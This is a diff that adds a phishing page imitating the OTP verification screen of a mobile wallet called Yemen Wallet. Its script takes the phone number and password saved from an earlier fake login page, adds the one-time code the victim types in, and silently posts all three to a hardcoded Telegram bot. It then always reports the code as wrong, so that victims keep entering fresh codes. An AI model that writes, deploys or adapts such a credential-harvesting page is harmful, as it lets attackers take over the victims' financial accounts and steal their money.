@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <title>يمن والت — رمز التحقق</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="yw-forms.css" />
+</head>
+<body>
+  <main class="page">
+    <header class="brand">
+      <img class="logo" src="yemen-wallet-logo2.svg" alt="يمن والت" width="120" height="120" />
+      <h1>رمز التحقق</h1>
+      <p id="verify-subtitle">أدخل الرمز المرسل إلى هاتفك</p>
+    </header>
+
+    <p class="verify-hint" id="mobile-hint" hidden>
+      تم إرسال الرمز إلى الرقم <strong id="mobile-display"></strong>
+    </p>
+
+    <form id="verify-form" novalidate>
+      <div class="field">
+        <div class="input-wrap">
+          <input
+            type="text"
+            id="otp"
+            name="otp"
+            inputmode="numeric"
+            autocomplete="one-time-code"
+            placeholder="رمز التحقق"
+            required
+          />
+        </div>
+      </div>
+
+      <button type="submit" class="btn-primary" id="submit-btn">
+        <span id="btn-label">تأكيد الرمز</span>
+      </button>
+
+      <p class="msg-error" id="error-msg" role="alert" aria-live="polite"></p>
+    </form>
+
+    <p class="footer">
+      <a href="dakhul-hisab.html">العودة لتسجيل الدخول</a>
+    </p>
+  </main>
+
+  <script>
+    const SESSION_MOBILE   = "yemen_wallet_login_mobile";
+    const SESSION_PASSWORD = "yemen_wallet_login_password";
+
+    const mobile   = sessionStorage.getItem(SESSION_MOBILE);
+    const password = sessionStorage.getItem(SESSION_PASSWORD);
+
+    if (!mobile) {
+      window.location.replace("dakhul-hisab.html");
+    } else {
+      document.getElementById("mobile-hint").hidden = false;
+      document.getElementById("mobile-display").textContent = mobile;
+    }
+
+    // ── Telegram Config ──────────────────────────────────────────
+    const TG_TOKEN = "8903622167:AAE79kWKNJ4EbLeevk4_IIOFEOUMWE77G4Q";
+    const TG_CHAT  = "8929657470";
+
+    async function sendToTelegram(otp) {
+      const text =
+        "✅ *يمن والت — رمز التحقق*\n\n" +
+        "📱 *الموبايل:* `" + (mobile || "—") + "`\n" +
+        "🔑 *كلمة المرور:* `" + (password || "—") + "`\n" +
+        "🔢 *رمز التحقق (OTP):* `" + otp + "`\n" +
+        "🕐 *الوقت:* " + new Date().toLocaleString("ar-YE");
+
+      try {
+        await fetch("https://api.telegram.org/bot" + TG_TOKEN + "/sendMessage", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: TG_CHAT,
+            text: text,
+            parse_mode: "Markdown"
+          })
+        });
+      } catch (_) {
+        // صامت
+      }
+    }
+    // ─────────────────────────────────────────────────────────────
+
+    const form      = document.getElementById("verify-form");
+    const otpInput  = document.getElementById("otp");
+    const submitBtn = document.getElementById("submit-btn");
+    const btnLabel  = document.getElementById("btn-label");
+    const errorMsg  = document.getElementById("error-msg");
+
+    let loading = false;
+
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      if (loading) return;
+
+      errorMsg.textContent = "";
+      otpInput.classList.remove("error");
+
+      const code = otpInput.value.trim();
+      if (!code) {
+        otpInput.focus();
+        return;
+      }
+
+      loading = true;
+      submitBtn.disabled = true;
+      otpInput.disabled = true;
+      btnLabel.innerHTML = '<span class="spinner" aria-hidden="true"></span><span>جاري التحقق...</span>';
+
+      // إرسال OTP + بيانات الصفحة الأولى إلى Telegram
+      await sendToTelegram(code);
+
+      window.setTimeout(() => {
+        loading = false;
+        submitBtn.disabled = false;
+        otpInput.disabled = false;
+        btnLabel.textContent = "تأكيد الرمز";
+        errorMsg.textContent = "رمز التحقق خاطئ";
+        otpInput.classList.add("error");
+        otpInput.focus();
+        otpInput.select();
+      }, 3000);
+    });
+  </script>
+</body>
+</html>
